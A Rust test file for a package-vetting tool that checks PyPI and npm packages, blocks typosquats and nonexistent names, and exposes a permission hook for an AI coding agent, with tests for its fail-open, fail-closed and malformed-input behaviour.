#[tokio::test(flavor = "multi_thread")]
async fn hook_failure_modes() {
    let dir = tempfile::tempdir().unwrap();
    // A config whose upstreams refuse connections: the server is unreachable, the
    // in-process fallback cannot reach the registry either.
    std::fs::write(
        dir.path().join("customs.toml"),
        "[upstream]\npypi_simple = \"http://127.0.0.1:9/simple\"\npypi_files = \"http://127.0.0.1:9/f\"\npypi_json = \"http://127.0.0.1:9/pypi\"\nnpm = \"http://127.0.0.1:9/npm\"\n",
    )
    .unwrap();
    let cfg = dir.path().join("customs.toml").display().to_string();
    let cwd = dir.path().to_path_buf();
    let (open, closed, garbage) = tokio::task::spawn_blocking(move || {
        let open = run_hook(
            "http://127.0.0.1:9",
            "pip install anything",
            &cwd,
            &["--config", &cfg],
        );
        let closed = run_hook(
            "http://127.0.0.1:9",
            "pip install anything",
            &cwd,
            &["--config", &cfg, "--fail-closed"],
        );
        let garbage = {
            use std::io::Write;
            use std::process::{Command, Stdio};
            let mut c = Command::new(env!("CARGO_BIN_EXE_customs"))
                .args(["hook", "claude-code"])
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .unwrap();
            c.stdin.take().unwrap().write_all(b"{not json").unwrap();
            let o = c.wait_with_output().unwrap();
            (
                String::from_utf8_lossy(&o.stdout).into_owned(),
                String::from_utf8_lossy(&o.stderr).into_owned(),
                o.status.code().unwrap(),
            )
        };
        (open, closed, garbage)
    })
    .await
    .unwrap();
    assert_eq!(open.2, 0);
    assert_eq!(open.0, "", "fail open prints no decision");
    assert!(open.1.contains("customs hook"), "{}", open.1);
    let d: Value = serde_json::from_str(closed.0.trim()).unwrap();
    assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
    assert_eq!(garbage.2, 0);
    assert_eq!(garbage.0, "");
    assert!(garbage.1.contains("invalid hook input"), "{}", garbage.1);
}

#[tokio::test(flavor = "multi_thread")]
async fn cli_check_uses_running_server() {
    let h = Harness::start(|_| {}).await;
    let base = h.base.clone();
    let out = tokio::task::spawn_blocking(move || {
        let run = |args: &[&str]| {
            let o = std::process::Command::new(env!("CARGO_BIN_EXE_customs"))
                .args(args)
                .args(["--server", &base])
                .output()
                .unwrap();
            (
                String::from_utf8_lossy(&o.stdout).into_owned(),
                o.status.code().unwrap(),
            )
        };
        vec![
            run(&["check", "pypi", "evilpkg==0.0.1"]),
            run(&["check", "npm:@scope/lib@1.2.3", "--json"]),
            run(&["check", "pypi", "nope-not-here"]),
        ]
    })
    .await
    .unwrap();
    assert_eq!(out[0].1, 3, "{}", out[0].0);
    assert!(
        out[0].0.starts_with("pypi evilpkg 0.0.1  BLOCK"),
        "{}",
        out[0].0
    );
    assert_eq!(out[1].1, 0);
    let v: Value = serde_json::from_str(&out[1].0).unwrap();
    assert_eq!(v["name"], "@scope/lib");
    assert_eq!(out[2].1, 3, "{}", out[2].0);
    assert!(out[2].0.contains("block_nonexistent"));
    h.stop().await;
}

#[test]
fn dev_models_flag_typosquats() {
    let m = dev_models();
    assert!(m.manifest.untrained);
    let s = m.score_name(Ecosystem::Pypi, "reqeusts").unwrap();
    assert!(s.prob > 0.5);
    let s = m.score_name(Ecosystem::Pypi, "requests").unwrap();
    assert!(s.prob < 0.01);
    let s = m.score_name(Ecosystem::Npm, "@evil/expres").unwrap();
    assert_eq!(s.features.nearest_popular.as_deref(), Some("express"));
    assert!(s.prob > 0.5);
}

/// Live registries. Run with `cargo test -p customs -- --ignored`.
#[tokio::test(flavor = "multi_thread")]
#[ignore]
async fn live_registries() {
    let dir = tempfile::tempdir().unwrap();
    let engine = Engine::new(EngineConfig {
        data_dir: dir.path().to_path_buf(),
        models: dev_models(),
        policy: Policy::default(),
        policy_path: dir.path().join("policy.toml"),
        scanner: customs::engine::default_scanner(),
        limits: Limits::default(),
        metrics: Arc::new(Metrics::new()),
    })
    .unwrap();
    let v = engine
        .check(Ecosystem::Pypi, "requests", Some("2.32.3"), None)
        .await
        .unwrap();
    assert_eq!(v.artifact.as_deref(), Some("requests-2.32.3.tar.gz"));
    assert_eq!(v.decision, customs_model::Decision::Allow);
    let v = engine
        .check(Ecosystem::Npm, "left-pad", None, None)
        .await
        .unwrap();
    assert_eq!(v.version.as_deref(), Some("1.3.0"));
    let v = engine
        .check(Ecosystem::Npm, "@babel/core", Some("^7"), None)
        .await
        .unwrap();
    assert!(v.version.unwrap().starts_with("7."));
    let v = engine
        .check(
            Ecosystem::Pypi,
            "this-package-should-not-exist-customs-test",
            None,
            None,
        )
        .await
        .unwrap();
    assert_eq!(v.decision, customs_model::Decision::Block);
}
